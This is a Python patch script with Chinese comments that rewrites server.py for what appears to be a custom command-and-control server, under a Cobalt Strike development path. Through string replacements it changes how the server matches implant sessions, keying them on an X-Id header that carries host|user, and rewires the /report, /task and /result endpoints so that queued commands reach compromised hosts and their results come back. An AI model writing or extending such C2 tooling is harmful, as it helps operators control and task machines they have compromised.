#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
patch_server.py  --  一次性把 server.py 改为用 X-Id 头匹配会话

背景: 原实现用源地址 (ip:port) 匹配会话, 但 WinHTTP 每次请求可能使用不同
源端口, 导致 /task 匹配失败、命令永远取不到。植入体改为通过 X-Id 头上报
host|user, 服务端据此匹配。
"""
import io
import re
import sys

PATH = r"D:\cobalt_strike_4.7\cs_dev\c2\server.py"

src = io.open(PATH, encoding="utf-8").read()

# ---- 1. Session.__init__ 加 ident ----
src = src.replace(
    "    def __init__(self, sid, info, addr):\n        self.sid = sid\n",
    "    def __init__(self, sid, info, addr, ident=\"\"):\n        self.sid = sid\n        self.ident = ident\n",
)

# ---- 2. C2State 加 by_ident ----
src = src.replace(
    "        self.sessions = {}\n        self.lock = threading.Lock()\n        self.counter = 0\n",
    "        self.sessions = {}\n        self.by_ident = {}\n        self.lock = threading.Lock()\n        self.counter = 0\n",
)

# ---- 3. get_or_create 用 ident 匹配 ----
old = re.search(r"    def get_or_create\(self, addr, info=None\):.*?return s\n", src, re.S)
if old:
    new = (
        '    def get_or_create(self, addr, info=None, ident=""):\n'
        '        with self.lock:\n'
        '            # 用植入体上报的 ident (host|user) 匹配 —— 不能用源地址:\n'
        '            # WinHTTP 每次请求可能使用不同的源端口\n'
        '            if ident and ident in self.by_ident:\n'
        '                s = self.sessions.get(self.by_ident[ident])\n'
        '                if s:\n'
        '                    s.last_seen = time.time()\n'
        '                    s.alive = True\n'
        '                    return s\n'
        '            self.counter += 1\n'
        '            sid = "S%03d" % self.counter\n'
        '            info = info or {}\n'
        '            s = Session(sid, info, addr, ident)\n'
        '            self.sessions[sid] = s\n'
        '            if ident:\n'
        '                self.by_ident[ident] = sid\n'
        '            log("[+] 新会话 %s  %s\\\\%s  arch=%s  id=%s"\n'
        '                % (sid, info.get("host", "?"), info.get("user", "?"),\n'
        '                   info.get("arch", "?"), ident))\n'
        '            return s\n'
    )
    src = src[:old.start()] + new + src[old.end():]

# ---- 4. /report 传 ident ----
src = src.replace(
    "            s = STATE.get_or_create(self.peer, info)",
    "            s = STATE.get_or_create(self.peer, info, self.ident)",
)

# ---- 5. /task 改用 ident ----
old = re.search(
    r"            # 用 addr\+host 定位会话\n.*?            s\.last_seen = time\.time\(\)\n", src, re.S)
if old:
    new = (
        "            sid = STATE.by_ident.get(self.ident)\n"
        "            with STATE.lock:\n"
        "                s = STATE.sessions.get(sid) if sid else None\n"
        "            if s is None:\n"
        "                return self._reply(200, b\"\")\n"
        "            s.last_seen = time.time()\n"
    )
    src = src[:old.start()] + new + src[old.end():]

# ---- 6. /result 改用 ident ----
old = re.search(
    r"            with STATE\.lock:\n                s = None\n                for cand in STATE\.sessions\.values\(\):\n                    if cand\.addr == self\.peer:\n                        s = cand\n                        break\n            if s:\n",
    src, re.S)
if old:
    new = (
        "            _sid = STATE.by_ident.get(self.ident)\n"
        "            with STATE.lock:\n"
        "                s = STATE.sessions.get(_sid) if _sid else None\n"
        "            if s:\n"
    )
    src = src[:old.start()] + new + src[old.end():]

# ---- 7. 加 ident property ----
src = src.replace(
    '    @property\n    def peer(self):\n        return "%s:%d" % self.client_address\n',
    '    @property\n    def peer(self):\n        return "%s:%d" % self.client_address\n'
    '\n'
    '    @property\n    def ident(self):\n'
    '        """植入体通过 X-Id 头上报的身份 (host|user)"""\n'
    '        return self.headers.get("X-Id", "")\n',
)

io.open(PATH, "w", encoding="utf-8", newline="\n").write(src)

# ---- 校验 ----
import ast
ast.parse(src)
checks = {
    "ident property": "def ident(self):" in src,
    "by_ident 写入": "self.by_ident[ident] = sid" in src,
    "report 传 ident": "info, self.ident" in src,
    "/task 用 ident": "STATE.by_ident.get(self.ident)" in src,
    "/result 用 ident": "STATE.by_ident.get(self.ident)" in src,
}
print("语法: 通过")
for k, v in checks.items():
    print("  %-18s %s" % (k, "OK" if v else "缺失!"))
